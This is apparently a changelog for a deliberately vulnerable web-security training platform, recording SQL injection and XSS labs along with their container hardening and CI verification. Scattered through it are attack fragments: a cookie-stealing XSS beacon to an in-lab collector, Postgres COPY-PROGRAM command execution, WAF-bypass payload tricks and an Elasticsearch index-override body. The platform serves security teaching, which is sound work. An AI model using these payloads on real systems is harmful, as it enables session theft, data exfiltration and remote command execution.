# Changelog

All notable changes to this project are documented here. Format loosely follows
[Keep a Changelog](https://keepachangelog.com/); the project uses batch tags
(`batch/<batch_id>`) rather than semantic version releases until v1.0.

## [Unreleased]

### track-xss-b-dom — two DOM-XSS apprentice labs (client-side sinks on the shared verifier)

- `dom-xss-hash-document-write` (**apprentice**): DOM XSS where `location.hash` flows into `document.write`
  unsanitised. Teaches the **same-origin-read** angle: `GET /flag.txt` is served only to a request carrying
  the admin cookie, so the host-side attacker can't read it — but JS injected via the DOM sink runs in the
  bot's origin, and its same-origin `fetch('/flag.txt')` sends the cookie. Payload is an `<img src=x
onerror=...>` written via `document.write` (runs during parse); it fetches the flag and beacons the body
  to the collector. Validates the verifier handles purely **client-side** sinks (the fragment never reaches
  the server).
- `dom-xss-innerhtml-jquery-html` (**apprentice**): DOM XSS via jQuery `.html()` (innerHTML) on load +
  hashchange. Cookie-theft model: `<img onerror>` reads `document.cookie` (non-HttpOnly) and beacons it to
  the collector; `/solve` exchanges the session for the flag. **jQuery pinned to current 3.7.1**, not the
  catalog's 3.4.1 — the taught flaw is the app's own `.html(untrusted)` misuse (identical on every version),
  and a non-CVE'd jQuery keeps the Trivy library gate honest and avoids an unintended solve path. jQuery is
  vendored (served locally) because the bot's backend network is egress-dropped (no CDN reachable).
- Both reuse the batch-a pattern verbatim (3 services app/bot/collector, edge + `internal:true` backend on
  fixed subnet, `/internal/*` firewalled to the backend by source IP + BOT_KEY). Verified clean-room:
  exploit exit 0 (both invocations), flag == expected HMAC, posture OK x3, anti-bypass 403s, egress-drop,
  app 135MB, no baked flag, Trivy library gate clean, drift-lint green (28 impl). SOLUTIONs carry explicit
  CWE-79 / OWASP-A03 citations (denetle batch-a OBS-1).

### track-xss-a-reflected — XSS victim-bot infra + first reflected lab (SQLi track done, XSS track begins)

- **`packages/xss-verifier`** (new shared package): a generic, env-driven **headless-Chromium victim
  bot** (Playwright, Python) for the XSS track. XSS is not grep-verifiable — the payload must run in a
  real browser — so this package IS that browser. One generic image serves every XSS lab; all behaviour
  comes from `XSSBOT_*` env (origin, login URL, queue URL, interval), so no lab ships bot code. The bot
  establishes its victim session at runtime by navigating an app `/internal/bot-login` endpoint (the
  per-container secret is never baked in or passed through env). Chromium runs `--no-sandbox
--disable-dev-shm-usage` so it works under the lab posture (`cap_drop: ALL`, `read_only`,
  `no-new-privileges`, non-root). README ships a compose + programmatic usage example.
- `reflected-xss-search-noescape` (**apprentice**): the first XSS lab and first consumer of the shared
  verifier. A bookshop reflects `?q=` into the search heading via an autoescape-disabled Jinja render
  (the canonical reflected-XSS footgun). A payload submitted through `POST /report` runs in the admin
  bot's browser, reads its **non-HttpOnly** `session` cookie, and beacons it to the in-lab collector
  (`new Image().src='http://collector:9000/report?c='+document.cookie`). The learner reads the exfil via
  the app proxy `GET /oob/received` and `POST /solve`s the 32-hex session for the flag.
- **Lab shape (sets the XSS-track pattern):** 3 services — `app` (Flask, the size/Trivy-gated
  `websec-lab/` image), `bot` (shared verifier, tagged `xssbot/` as browser infra like a pulled DB
  engine — posture-gated but not size-gated), `collector` (stdlib http.server, reused from SQLi OOB).
  2 networks: `edge` (app published to loopback) + `backend` (`internal: true`, egress-drop, fixed
  subnet `172.31.240.0/24`). The stolen cookie can reach only the in-lab collector, never the internet.
- **Anti-bypass:** `/internal/bot-login` (mints the admin cookie via `Set-Cookie`) and `/internal/queue`
  are firewalled to the backend subnet by source IP AND gated by a `BOT_KEY`, so a public-side visitor
  cannot fetch the admin cookie directly — the reflected-XSS path is the only way in. `risk: low`.
- Catalog reconciled (Hybrid): the entry's `tech_stack` updated from the aspirational Puppeteer/Node/nginx
  stack to the shipped Flask + Playwright-verifier + stdlib-collector stack; drift-lint green (26 impl).

- `sqli-mssql-stacked-openrowset-exfil` (**expert**, `resource_tier: heavy`): Stacked-query injection in a
  Flask + pyodbc asset inventory backed by **MSSQL 2022 Developer (CU16, Linux)**. The search endpoint
  (`/assets?category=<c>`) is blind (count only, no error text, random 100-600ms jitter). But MSSQL
  evaluates every `;`-separated statement in the batch (unlike Oracle/MySQL), so the student stacks an
  INSERT that copies `secrets.mssql_secret` into the `notices` table and reads it back via `GET /notices`.
  Advanced path: enable `Ad Hoc Distributed Queries` via `sp_configure` + `RECONFIGURE`, then read
  arbitrary files via `OPENROWSET(BULK '/etc/hostname', SINGLE_CLOB)`.
- **Re-platformed from catalog's Windows spec**: original catalog specified Windows Nano Server / ASP.NET /
  IIS / xp_cmdshell. xp_cmdshell is **not supported on MSSQL Linux** (`sp_configure` rejects it). The
  stacked-query primitive and `sp_configure` teaching are preserved; OPENROWSET BULK replaces xp_cmdshell
  as the advanced file-access vector. Catalog entry updated to reflect the Linux re-platform.
- **MSSQL 2022 hardening pattern empirically verified**: `read_only:true` + anonymous volume for
  `/var/opt/mssql` (DB auto-populates template files on first start); `cap_drop:ALL` + `cap_add:
NET_BIND_SERVICE` (sqlservr carries `cap_net_bind_service=ep` file capability — the ONLY added cap,
  permits binding privileged ports, zero privilege escalation); `no-new-privileges:true`; non-root `mssql`
  user (image default). 2-service compose (app + db), egress-drop backend network.
- `risk:low` — no RCE (stacked queries run within the DB as SA; xp_cmdshell is unavailable).
- posture PASS both (app uid 10001, db uid mssql); exploit exit 0 in <2s.
- **SQLi track COMPLETE: 25/25 labs shipped.** Next track: XSS.

### track-sqli-d-oracle-oob — Oracle SQLi → UTL_HTTP OOB exfil (1, second heavy lab)

- `sqli-oob-dns-oracle-utlhttp` (**expert**, `resource_tier: heavy`): SQLi in a Flask + python-oracledb
  reports endpoint escalating to an out-of-band HTTP call via Oracle's `UTL_HTTP` package. The endpoint
  returns a fixed "found N reports" summary with no error text and ~100-600ms jitter — three doors closed
  at once for the in-band-read strategy. But the app's DB role (REPORTAPP) has `EXECUTE ON UTL_HTTP` +
  a narrow network ACL for host `oob` port 9000, so the injection embeds a **scalar-subquery
  UTL_HTTP.REQUEST** into the WHERE-clause concat, which Oracle evaluates as a side effect during query
  processing. The collector logs the beacon; the app's `/oob/received` proxy reveals the exfil; POST /solve
  redeems the flag.
- **Stack re-platformed Java/Spring Boot → Python/Flask (Hybrid policy):** taught primitive is
  language-independent (JDBC and python-oracledb behave identically for the concat sink); Oracle DB IS
  preserved as the engine (the lesson is Oracle's package model, not the app language).
- **Empirically verified Oracle 21c XE hardening pattern** (recorded to memory): rootfs stays `read_only:
true`, anonymous Docker volumes auto-populate `/opt/oracle/oradata|dbs|homes|admin|diag` from image on
  empty mount; `/tmp:exec` + `/var/tmp:exec` tmpfs required (JNA mmap+exec + TNS IPC socket in
  `/var/tmp/.oracle/`). Faststart's pre-seeded XEPDB1 must be used — DO NOT set `ORACLE_DATABASE`
  (fresh-PDB creation OOMs under caps).
- **Egress-drop verified live**: DB has no default route; `bash -c '</dev/tcp/1.1.1.1/443>'` fails with
  Network is unreachable; but db → oob:9000 works. Egress-drop closes any exfil channel other than the
  in-lab collector. `risk: low` — no RCE primitive on this ACL.
- 3-service compose (app + Oracle + OOB collector on same base image); posture PASS all 3 (app 10001, db
  54321, oob 10001); app image 160 MB; Oracle image 4.4 GB (pulled engine, not size-capped per denetle's
  Q5); both Trivy gates green on own app image; exploit exit 0 in ~1.4 s; checker solved; no-baked-flag;
  digest-pinned; drift-lint green (24 impl, partition 22+2=24 complete).
- **Catalog reconcile (Hybrid)**: `tech_stack` → shipped Flask + oracledb + Oracle 21c XE + OOB collector;
  `resource_tier: heavy` added; `objective`/`flag_hint` → real scalar-subquery UTL_HTTP chain. Track → **24/25**.

### track-sqli-d-heavy-infra-plus-es — heavy-tier CI/schema + first heavy lab (Elasticsearch DSL)

Shared infra + a real heavy consumer, per AUDITOR's design-preflight PASS (C1+C3+C5).

**Infra:**

- `labctl/src/schemas/meta.schema.json`: new optional `resource_tier: 'standard' | 'heavy'` field
  (defaults to 'standard' when absent, so all 22 shipped labs are unchanged). Orthogonal to `risk`
  (risk = security posture, tier = resource budget) — schema addition, no conditional coupling.
- `.github/workflows/ci.yml`: `discover-labs` now partitions every discovered meta.json into
  standard vs heavy by `resource_tier` (jq: `.resource_tier // "standard"`). The PR-blocking
  `docker-lab-matrix` still consumes the standard partition unchanged — zero regression for the 22
  shipped labs. **C1 completeness assertion**: fails the run if any lab lands in neither partition
  (typo'd `resource_tier`, jq hiccup) so a lab is NEVER silently tested nowhere.
- `.github/workflows/heavy-nightly.yml` (new): nightly (`0 3 * * *`) + `workflow_dispatch`, NEVER
  push/PR. Mirrors the standard matrix steps 1:1 with tier-relaxed numeric limits (`timeout-minutes:
45`, image size cap 4096 MB, exploit `--timeout 180`, compose `--wait-timeout 300`) — every
  posture rule identical (non-root, ReadonlyRootfs, cap_drop:ALL, no-new-privileges, loopback-only,
  digest-pinned, own-image Trivy 2-gate). Concurrency guard prevents manual+cron collision. **C3
  rolling-issue-on-failure**: on any red run, opens OR comments on a single deduped issue titled
  "heavy-nightly: red run" via `github-script` — visible failures without per-night spam.
- `scripts/build-catalog.ts`: added `resource_tier` to `CatalogLab` and `Meta` interfaces + a
  drift-lint check mirroring the tech_stack policy (catalog and meta must agree).

**First heavy lab (C5: real consumer, not a stub):**

- `sqli-elasticsearch-dsl-painless` (**expert**, `resource_tier: heavy`): NoSQL/query-DSL injection
  in a Node/Fastify log-search that spreads a caller-supplied JSON body over the ES client call:
  `es.search({ index: "logs", ...body })`. JS object-spread has right-side precedence — a body-level
  `index` key overrides the intended `"logs"` scope, so `{"index":".credentials","query":{...}}`
  reveals the hidden credentials doc's `secret_key`. Submit to `/solve`.
- Painless deviation (documented in SOLUTION): 8.x sandbox blocks `java.io`/`Runtime`/cross-index
  reads from within a script, so the aspirational "script_fields to cross-index" is technically
  infeasible; the honest primitive is DSL index-scope injection. Painless remains a companion
  field-extraction vector.
- ES-specific hardening deviation (documented): rootfs stays `read_only: true`; the compose
  entrypoint copies the shipped ES config to a writable tmpfs and sets `ES_PATH_CONF` at it (ES
  needs a writable keystore dir at startup). `/tmp` mounted `exec` because JNA `mmap+exec`s
  native libraries.
- Verified clean-room: fresh build, posture BOTH containers (app uid 10001, es uid 1000 — non-root
  under `cap_drop:ALL` + `read_only` + `no-new-privileges`), app image 154 MB, ES image ~1.2 GB
  (heavy-cap 4096), both Trivy gates green on the own app image (Fastify 5.12 / ES client 8.15.3 —
  0 vulns), no-baked-flag, digest-pinned, exploit exit 0 in ~0.1 s, checker solved.
- **Partition end-to-end verified**: 22 standard + 1 heavy = 23 total (partition complete). ES lab
  is scoped to the heavy matrix; the 22 shipped labs are untouched by this batch.
- **Catalog reconcile (Hybrid)**: `tech_stack` → shipped Fastify 5.12 / ES 8.15.5 / client 8.15.3;
  `resource_tier: heavy` added; `objective`/`flag_hint` → the real body-spread scope-widening chain.
  Takes the track to **23/25**.

### track-sqli-d-fortinet — header SQLi → RCE with OOB exfil (1, first OOB/IPS-evasion lab)

- `sqli-fortinet-ems-fctuid-rce` (**elite**): abstracts **CVE-2023-48788 (FortiClient EMS)**. The
  `X-FCTUID` header is concatenated into an INSERT run via psycopg2 `.execute()` (stacked). A naive
  keyword IPS blocks `SELECT`/`UNION`/`FROM`/`INFORMATION_SCHEMA`/`SLEEP(`/`OR n=n`; the intended
  bypass uses **table-source `COPY audit_log TO PROGRAM '<cmd>'`** (contains no `SELECT`), which
  Postgres runs as a superuser (INTENTIONAL here — the lab teaches exactly this misconfiguration).
  The RCE `wget`s the planted `/labflag/flag.txt` to an in-lab OOB collector sidecar; the learner
  reads it via `GET /oob/received` (app-side proxy) and POSTs to `/solve`.
- **3-service compose** (app + superuser-postgres + oob-collector on the SAME base image, stdlib
  http.server — no extra image or Trivy surface) on **2 networks** (`edge` for app port publishing,
  `backend` `internal: true` for db+oob). Verified live: db has no default route (Network unreachable
  to 1.1.1.1), but db → `http://oob:9000` succeeds — collector is the ONLY listener reachable from
  the RCE, exactly as designed.
- **Stays `risk: low`** despite intentional RCE (same rationale as copy-program): `COPY PROGRAM` needs
  no added Linux caps; `cap_drop:ALL` + read_only + no-new-privileges kept; the egress-drop provides
  containment. Flag planted app-side via superuser `COPY TO` — the raw secret never reaches Postgres.
- **Stack re-platformed to Linux (Flask + PostgreSQL)** from the catalog's ASP.NET/Windows Server
  Core/MSSQL 2022/IIS spec (Windows containers cannot run on Linux Docker; MSSQL blows 512m/300MB).
  Primitive preserved (psycopg2 `.execute()` stacks like `SqlCommand`; `COPY ... TO PROGRAM` is the
  Postgres analogue of `xp_cmdshell`). IIS omitted as transport.
- Verified clean-room: fresh build, posture ALL 3 containers (app 10001, db 70, oob 10001), 143 MB,
  both Trivy gates green, no-baked-flag, digest-pinned, IPS blocks bare UNION (403), intended exploit
  exit 0 in <1 s, checker solved.
- **Catalog reconcile (Hybrid)**: `tech_stack` → shipped Flask/Postgres + OOB collector sidecar;
  `objective`/`flag_hint` → the real header-SQLi → COPY-TO-PROGRAM → OOB chain. Track → **22/25**.

### track-sqli-d-moveit — header SQLi → session forgery → file exfil (1, first auth-bypass-by-write lab)

- `sqli-moveit-header-auth-bypass-chain` (**elite**): abstracts **CVE-2023-34362 (MOVEit Transfer)**. An
  `X-siLock-Comment` request header is concatenated into an audit-log `INSERT` run via psycopg2 `.execute()`
  (stacked statements). The chain: stack a second `INSERT` that forges a valid `sysadmin` row in the
  database-backed **session store** (auth bypass by WRITING state, not reading), reuse that cookie to
  `GET /files/download?path=confidential/flag.bin`, then `POST /solve` with the file's SHA-256. The
  confidential file is per-container (derived from `LAB_USER_SECRET`), so only a real download validates.
- **Re-platformed to Linux (Flask + PostgreSQL)** from the catalog's ASP.NET/MSSQL-2022/nginx spec — MSSQL
  needs ~2 GB RAM / ~1.5 GB image (blows the 512m/300MB gates). The taught primitive is identical (psycopg2
  `.execute()` stacks statements like MSSQL `SqlCommand`); nginx omitted as a transport detail. `risk: low`,
  no RCE.
- Verified clean-room: fresh build, posture both containers (app uid 10001, db uid 70), image 143 MB, both
  Trivy gates green (Flask 3.1 / gunicorn 23 / psycopg2 2.9 / werkzeug 3.1.8 — 0 vulns), no-baked-flag,
  digest-pinned, exploit exit 0 in <1 s (download gated 403 before forgery → 200 after), checker solved.
- **Least-privilege DB role (security-critical):** the app connects as a **non-superuser** Postgres role
  (`moveitapp`, created by `db-init/01-init.sql` at init) with only INSERT on audit_log/sessions + SELECT on
  sessions/users. This forecloses the unintended `COPY ... FROM/TO PROGRAM` RCE that a superuser app role
  would expose through the same stacked-query sink; the intended plain-INSERT session forgery still works.
  The DB is additionally placed on an `internal: true` no-egress network (defense in depth). (Addresses
  AUDITOR BL-1: `POSTGRES_USER` is always a superuser, so the initial cut shipped a trivially-reachable
  RCE with open egress.)
- **Catalog reconcile (Hybrid)**: `tech_stack` → shipped Flask/Postgres; `objective`/`flag_hint` → the real
  header-SQLi → session-forgery → SHA-256 chain. Adds OWASP A07 + CWE-565 (reliance on an unvalidated
  session cookie). Track → **21/25**.

### track-sqli-d-copy-program — Postgres SQLi → COPY FROM PROGRAM RCE chain (1, first RCE lab)

- `sqli-postgres-copy-program-rce-chain` (**elite**): the project's first **SQLi-to-RCE** lab. A FastAPI +
  asyncpg metrics service connects to PostgreSQL 16 as a **superuser** (the mis-configuration). Two
  concatenated sinks: a VISIBLE `GET /metrics?category=` (asyncpg `.fetch`, extended protocol, UNION-read)
  and a STACKED-capable `POST /metrics/ingest` (asyncpg `.execute`, simple protocol). Chain: stacked
  `CREATE TABLE loot; COPY loot FROM PROGRAM 'cat /labflag/flag.txt'` (command execution inside the Postgres
  container) → UNION-read `loot` → `POST /solve`. The flag is planted on the **Postgres filesystem** (via a
  superuser `COPY TO`, derived app-side — the raw secret never reaches Postgres), so only command execution
  recovers it, never a SQL `SELECT`.
- **Stays `risk: low`** (empirically justified + matches the AUDITOR charter checklist): `COPY FROM PROGRAM`
  runs as the unprivileged postgres uid and needs **no added Linux capabilities**, so `cap_drop: ALL`,
  read-only rootfs, `no-new-privileges`, and pids/mem caps are all kept intact. Containment is completed by
  an **egress-drop network**: the Postgres container sits alone on an `internal: true` bridge with **no
  default route** (verified: outbound DNS/TCP fails), so a shell from the RCE cannot phone home or pivot.
  No new CI infra was needed (no `LAB_RISK=elevated` propagation, since the lab is `low`).
- Verified clean-room: fresh build, posture gate both containers (app uid 10001, db uid 70, read_only,
  cap_drop ALL, no-new-privileges, DB no host port), image 157 MB, both Trivy gates green (bumped
  fastapi 0.115→**0.141.1** / starlette→**1.6.0** / uvicorn→**0.52.4** to clear 3 fixed starlette HIGH
  CVEs), no-baked-flag, digest-pinned bases, exploit exit 0 in <1 s (two HTTP requests), checker solved.
- **Catalog reconcile (Hybrid policy)**: `tech_stack` updated to the shipped versions (FastAPI 0.141,
  asyncpg 0.30, PostgreSQL 16.15); `objective`/`flag_hint` corrected to the real two-sink COPY-FROM-PROGRAM
  chain + the `risk:low` rationale. Takes the track to **20/25** implemented.

### track-sqli-d-layerslider — unauthenticated time-blind SQLi in a WP-style plugin (1, first PHP/WAF lab)

- `sqli-layerslider-unauth-time-blind` (**elite**): the first lab on the **PHP 8.2 / Apache 2.4 /
  MariaDB 11.4** stack (Alpine, 26 MB) and the first with a **WAF-bypass** dimension. Unauthenticated
  time-based blind SQLi through a WordPress-style `admin-ajax.php` action, abstracting **CVE-2024-2879
  (LayerSlider)**. Reproduces the `wpdb::prepare()` concatenation footgun (a query interpolated with no
  `%d` placeholder is not parameterised); the endpoint is a pure timing oracle (body/status/headers never
  vary); a ~300-LOC hand-written WP shim plus an app-level CRS-paranoia-1 SQLi-filter homage and a per-IP
  token-bucket rate limiter. Intended exploit bypasses the filter with `SLEEP/**/(` (inline comment breaks
  the `SLEEP(` rule; MariaDB accepts the comment as whitespace) and `0x61646d696e` (hex `admin`, no quotes),
  binary-searches `wp_users.user_pass` parallelised across positions, and lands the flag in ~15–25 s.
- Hardened non-root **app + non-root DB** (mysql uid 999, tmpfs datadir); posture gate, both Trivy gates
  (library + OS, clean — no composer deps), `<300 MB` (26 MB), no-baked-flag, digest-pinned bases all green.
- `user_pass` is a random 16-hex per-container token (not a 34-char phpass hash) so the rate-limited
  time-based extraction clears the `<60 s` gate — technique identical at any length (documented in SOLUTION).
- **Catalog reconcile (Hybrid policy)**: `sqli-layerslider-unauth-time-blind` `tech_stack` updated to the
  shipped stack (Alpine 3.20; app-level CRS-baseline filter in place of a full ModSecurity+CRS sidecar) so
  the meta↔catalog drift-lint stays green; `objective`/`flag_hint` corrected to the real `POST /solve
{"hash":...}` mechanism (no `give-flag.sh`). Takes the track to **19/25** implemented.

### chore-sqli-c-docs — docs/metadata polish for track-sqli-c (AUDITOR BL-1..BL-8)

- **BL-1**: `sqli-json-body-prisma-raw` and `sqli-rails-active-record-hash` SOLUTION.md now list ≥3 distinct payload vectors each.
- **BL-2**: all six track-sqli-c SOLUTION.md carry an explicit **OWASP / CWE / CVE** line.
- **BL-3**: `sqli-json-body-prisma-raw` catalog prose corrected (real `SELECT id, title, status` column list; text, not jsonb, columns).
- **BL-4**: `sqli-couchdb-mango-selector` meta `inspired_by` no longer cites the unrelated CVE-2022-24706 (Erlang-dist RCE).
- **BL-5**: `sqli-django-extra-orm` bumped Django 5.1.14 (security-EOL) → **5.2.17 LTS** (rebuilt + re-verified, Trivy green).
- **BL-6**: `sqli-rails-active-record-hash` version drift fixed (`load_defaults`/README/Gemfile 7.1 → 7.2), stale `rails runner` and nokogiri comments corrected, README time aligned to meta (45 min), dropped `permit(:category)` for a non-existent column.
- **BL-7**: `sqli-graphql-batch-prisma-raw` SOLUTION backticks repaired, README no longer spells out the breakout (deferred to hints), and the non-existent "resolver-level rate limit" claim removed from the objective/SOLUTION.
- **BL-8**: `sqli-mongo-operator-login-bypass` and `sqli-django-extra-orm` `exposed_service.http_path` now point at the GET landing (`/`) instead of a POST-only route.
- Docs/metadata/version-currency only; the two rebuilt labs (django, rails) re-verified green (posture, exploit, checker, both Trivy gates, < 300 MB).

### track-sqli-c — native-stack SQLi/NoSQL labs 13–18 (6)

- Six new labs built in their **native stacks** (the Hybrid "diversity" batch), each with a hardened
  non-root app AND non-root database service, intended exploit landing the flag in under 60 s, a passing
  multi-container posture gate, both Trivy gates (library + OS) green, and image < 300 MB:
  `sqli-json-body-prisma-raw` (Node/Fastify/Prisma `$queryRawUnsafe` via a JSON body value, Postgres),
  `sqli-mongo-operator-login-bypass` (NoSQL `$ne` auth bypass + `$regex` blind extraction, Node/Express/mongoose/MongoDB, CWE-943),
  `sqli-couchdb-mango-selector` (Mango `_find` selector access-control bypass, FastAPI/CouchDB, CWE-943),
  `sqli-django-extra-orm` (`.extra()` raw-SQL UNION to read `auth_user`, Django/Postgres),
  `sqli-rails-active-record-hash` (`Arel.sql` ORDER BY ordering-oracle blind extraction, Rails 7.2/Puma/Postgres),
  `sqli-graphql-batch-prisma-raw` (batched-alias boolean-blind feeding Prisma `$queryRawUnsafe`, Apollo Server/Prisma/Postgres).
- New hardened non-root DB / runtime patterns established for the platform:
  - **MongoDB 7** — uid 999, tmpfs `/data/db`, `--wiredTigerCacheSizeGB 0.25`, and a bash `/dev/tcp` healthcheck
    (mongosh as a healthcheck spawned a ~150 MB Node process each interval and OOM-killed mongod under `mem_limit`).
  - **CouchDB 3.4** — uid 5984, tmpfs for every writable path (`/opt/couchdb/data`, `/opt/couchdb/etc/local.d`).
  - **Node 20-alpine** — multi-stage; Prisma musl query-engine + `apk add openssl` (else Prisma loads a missing
    1.1.x engine); the base image's bundled **npm is stripped from the runtime** (its deep dep tree — tar/pacote/
    sigstore/minimatch/… — carries fixed HIGH CVEs the library gate blocks, none reachable in a `node`-only runtime).
  - **Ruby 3.3-slim** — multi-stage; `pg` compiled from source (`BUNDLE_FORCE_RUBY_PLATFORM`) so it links the system
    libpq; stale default `resolv` gemspec dropped so the patched bundled gem is what the scanner sees.
- 18/25 SQLi labs implemented — **all Linux-feasible SQLi labs are now done**. `data/catalog.json` tech_stack
  reconciled to the shipped stacks for the six (drift-lint green).

### chore-catalog-reconcile — catalog honesty + drift guardrail

- Reconciled `data/catalog.json` `tech_stack` for all 12 implemented labs to match each
  lab's shipped `meta.json` (track-a stays diverse as built; the 6 track-b labs are Flask),
  per the operator's Hybrid re-platform ruling (future feasible labs default to Flask +
  MySQL/Postgres; stack diversity revisited later for select flagship tracks).
- Fixed `sqli-limit-offset-postgres`'s catalog description/objective, which described a
  post-`LIMIT` `UNION` (forbidden in Postgres) rather than the shipped scalar-subquery error oracle.
- `scripts/build-catalog.ts`: new gate — an implemented lab whose catalog `tech_stack` differs
  from its `meta.json` now fails the build (exact array equality), so the two cannot silently
  drift again. Unbuilt catalog entries keep their aspirational stack freely. Resolves the
  track-a/-b `tech_stack`-drift follow-up.

### track-sqli-b — SQLi labs 7–12 (6)

- Six new SQLi labs extending the track into new injection techniques, contexts, and surfaces —
  each with a hardened non-root app AND non-root database service, exploit landing the flag in
  well under 60 s, passing multi-container posture gate, and both Trivy gates (library + OS) green:
  `sqli-error-based-extractvalue` (EXTRACTVALUE/UPDATEXML XPATH error exfil with 32-char
  truncation chunking, MySQL), `sqli-time-blind-mysql-sleep` (time-based blind in an INSERT
  context via `IF(...,SLEEP(),0)` subquery, MySQL — threaded exploit, ~15 s),
  `sqli-header-user-agent-analytics` (stored/second-order injection through the `User-Agent`
  header, re-spliced on the admin read path, MySQL), `sqli-limit-offset-postgres` (injection in
  the `LIMIT/OFFSET` position via a scalar-subquery error oracle, Postgres),
  `sqli-waf-bypass-versioned-comments-mysql` (MySQL `/*!50000...*/` versioned-comment keyword
  evasion, with a `/waf-log` rule-fired oracle), `sqli-waf-bypass-whitespace-tabs` (space-free
  payloads via `/**/` and newline separators against a whitespace-stripping filter, with a
  `/debug` byte-echo endpoint).
- Deliberate deviations from `data/catalog.json`, documented in each lab's `SOLUTION.md`:
  the time-blind token is 16 hex chars (not 40) so the intended exploit fits the platform's
  <60 s exploit gate at the same 1-bit-per-request cadence; the LIMIT/OFFSET lab uses a scalar
  subquery error oracle rather than a post-`LIMIT` `UNION` (which Postgres grammar forbids).
- 12 labs implemented total (all `sqli`); catalog/map regenerate clean.

### track-sqli-a — first SQLi labs (5)

- Five new SQLi labs covering the core progression, each with a hardened non-root app AND
  non-root database service (read_only, cap_drop ALL, no-new-privileges, pids/mem limits,
  loopback-only port), exploit landing the flag in <1s, and a passing multi-container posture gate:
  `sqli-order-by-numeric` (ORDER BY error-oracle, Postgres), `sqli-union-product-search`
  (UNION, MySQL), `sqli-cookie-tracking-id` (cookie UNION, Go+SQLite),
  `sqli-boolean-blind-account-enum` (boolean-blind, FastAPI+Postgres),
  `sqli-second-order-registration` (second-order, Django+Postgres).
- `scripts/check-posture.sh` now asserts the baseline on every container in a lab (app + DB);
  CI passes all compose container ids.
- Established the hardened non-root Postgres (user 70) and MySQL (user 999) multi-service patterns.
- `packages/schema/enums.json`: added CWE-204 (Observable Response Discrepancy) and CWE-208.
- `docs/tracks/sqli.md`: track charter; defers Windows-container / Oracle / Elasticsearch labs
  as infeasible-as-specified (charter decision pending).

### ui-phase-1-shell — hub shell

- Interactive level map (`/map`): SVG render of all 541 nodes from `map.generated.json` with
  pan/drag, wheel-zoom (0.35–2.5, around pointer), viewport culling, tier-coloured hex nodes,
  solved/available/locked states, keyboard navigation (arrows/Enter/±/0), an `aria-live` focus
  announcer, and a "Text map" accessible tree of real links.
- Lab detail pages (`/lab/[category]/[slug]`, all 541 statically exported): real Scenario/Objective/
  Getting-started from the catalog, free progressive hints (native `<details>`), Playable/Roadmap
  badge, and a flag-submit form.
- `labctl-client.ts`: WebSocket client for the local daemon with automatic static-mode fallback
  (1.5s connect timeout); flag form verifies live when the daemon answers, else stores locally.
- Global ⌘K command palette (native `<dialog>`, focus-trapped) over all labs + pages, fed by a
  generated `hub/public/labs-index.json`.
- No new runtime dependencies (native `<dialog>`/`<details>`, custom SVG); matrix theme + a11y throughout.
- Closes NTH-6 (build-catalog docstring); CI hub-build now also generates the map.

### arch-000 — P0 bootstrap

- Monorepo scaffold: pnpm 9 workspace (`hub`, `labctl`, `packages/*`), Node 24 pin, TS strict base config.
- Next.js 15 App Router hub with matrix-theme shell, design tokens, code-rain, and 9 route stubs.
- `labctl` CLI skeleton (commander) + WebSocket daemon skeleton bound to `127.0.0.1:5174`
  (origin allowlist, per-install bearer token) + SQLite schema + `meta.schema.json` v1.0.0.
- `packages/schema` canonical OWASP Top 10 (2021) / API Top 10 (2023) / CWE enums.
- Sample lab `labs/sqli/sqli-login-bypass-basic` (the `labctl new-lab` template) — all seven artifact groups,
  digest-pinned Alpine+Apache+PHP+SQLite, non-root, read-only rootfs, `cap_drop: ALL`, exploit lands in <1s.
- `scripts/build-catalog.ts` (schema-validated catalog index) and `scripts/build-map.ts` (elkjs layered map).
- CI: lint + typecheck + schema-validate + hub-build + docker-lab-matrix + gitleaks + trivy + dive.
- Kickoff pack staged into `data/` and `docs/`.
